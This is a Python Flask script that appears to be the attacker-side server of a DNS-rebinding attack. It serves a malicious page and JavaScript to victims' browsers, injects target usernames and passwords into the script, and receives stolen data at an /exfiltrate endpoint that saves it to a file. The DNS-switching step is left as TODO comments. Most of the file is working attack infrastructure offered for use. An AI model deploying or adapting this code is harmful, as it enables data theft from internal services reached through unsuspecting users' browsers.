#!/usr/bin/env python3

# set up HTTP listener on specified port
# HTTP listener serves:
#  * index.html which loads evil.js
#  * evil.js
#  * a /ping URL for the script to signal a payload
#  * a /exfiltrate URL:
#   * GET /exfiltrate?payload=stuff
#   * POST /exfiltrate payload=base64 encoded...

from __future__ import print_function
import argparse
from flask import Flask, render_template, request, url_for

# from dnslib.fixedresolver import FixedResolver
# from dnslib.server import DNSServer
#
# res = FixedResolver()
# server = DNSServer(res, port=8053, address="localhost")
# server.start_thread()

app = Flask(__name__)

DEFAULT_SCHEMA = "http"
DEFAULT_PORT = "8080"
DEFAULT_PINGBACK_PATH = "/gotstuff"
DEFAULT_EXFILTRATE_PATH = "/exfiltrate"
DEFAULT_EVIL_HTML = "/evil.html"
DEFAULT_EVIL_JS = "/evil.js"

out_file = "out.txt"


@app.after_request
def return_cors(response):
    # response.headers["X-Frame-Options"] = "SAMEORIGIN"
    # response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    response.headers['Cache-Control'] = 'no-cache'
    return response


def evil_html():
    # nothing to substitute for now, but might change in the future
    print(url_for('exfiltrate'))
    return render_template("evil.html", evil_js=app.config['evil_js'])


def generate_urls(args):
    if not args.target_path.startswith('/'):
        args.target_path = '/' + args.target_path
    if not args.pingback_path.startswith('/'):
        args.pingback_path = '/' + args.pingback_path
    if not args.exfiltrate_path.startswith('/'):
        args.exfiltrate_path = '/' + args.exfiltrate_path

    app.config['evil_url'] = "{}://{}:{}{}".format(
        args.schema, args.domain, args.port, args.evil_html)
    app.config['target_url'] = "{}://{}:{}{}".format(
        args.schema, args.domain, args.port, args.target_path)
    # pingback listens on the same port to automate DNS switching
    app.config['pingback_url'] = "{}://{}:{}{}".format(
        args.pingback_schema, args.pingback_domain, args.port,
        args.pingback_path)
    app.config['exfiltrate_url'] = "{}://{}:{}{}".format(
        args.schema, args.domain, args.port, args.exfiltrate_path)

    print("[+] Evil page listening on {}".format(app.config['evil_url']))
    print("[+] Pingback URL: {}".format(app.config['pingback_url']))
    print("[+] Exfiltrate URL: {}".format(app.config['exfiltrate_url']))
    print("[+] Target URL: {}".format(app.config['target_url']))


def evil_js():
    # TODO switch dns entry to target IP
    return render_template(
        'evil.js',
        username=app.config['username'],
        password=app.config['password'],
        target=app.config['target_url'],
        pingback=app.config['pingback_url'],
        exfil=app.config['exfiltrate_url'])


def pingback():
    print("[+] Data has been acquired. Switch back the DNS entry...")
    # TODO switch DNS entry to attacker IP
    return "OK"


def exfiltrate():
    exfil_data = request.args.get('e', '')
    # TODO save to db? Append to file? Whateva..
    print("[+] Got data! Saving to {}".format(out_file))
    with open(out_file, 'w') as f:
        f.write(exfil_data)
    return "OK"


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("domain", help="Domain to use")
    parser.add_argument("pingback_domain", help="Pingback domain")
    parser.add_argument("target_path")
    parser.add_argument("--target-username", default="")
    parser.add_argument("--target-password", default="")
    parser.add_argument("-s", "--schema", default=DEFAULT_SCHEMA)
    parser.add_argument("-p", "--port", default=DEFAULT_PORT, type=int)
    parser.add_argument("--pingback-schema", default=DEFAULT_SCHEMA)
    parser.add_argument("-b", "--pingback-path", default=DEFAULT_PINGBACK_PATH)
    parser.add_argument("--exfiltrate_path", default=DEFAULT_EXFILTRATE_PATH)
    parser.add_argument("--evil-html", default=DEFAULT_EVIL_HTML)
    parser.add_argument("--evil-js", default=DEFAULT_EVIL_JS)
    # the DNS stuff
    # TODO
    # parser.add_argument("attacker_ip")
    # parser.add_argument("target_ip")
    parser.add_argument("-d", "--debug", action="store_true")
    args = parser.parse_args()

    print("[+] Loading...")

    if args.debug:
        app.debug = True
        # javascript: generate a new timestamp. The template will append a "; to the end of this string
        args.target_path += args.target_path + '"+ "?" + new Date().getTime() + "'
        print("[+] Debug mode enabled: the target path has a timestamp appended to avoid caching...")

    # app.config['args'] = args
    # this will store the URLS in app.config[]
    generate_urls(args)
    # stored here to be used in evil_html
    app.config['evil_js'] = args.evil_js
    app.config['username'] = args.target_username
    app.config['password'] = args.target_password

    app.add_url_rule("{}".format(args.evil_html), 'evil_html', evil_html)
    app.add_url_rule("{}".format(args.evil_js), 'evil_js', evil_js)
    app.add_url_rule("{}".format(args.pingback_path), 'pingback', pingback)
    app.add_url_rule(
        "{}".format(args.exfiltrate_path),
        'exfiltrate',
        exfiltrate)

    app.run(host="0.0.0.0", port=args.port)


if __name__ == '__main__':
    main()
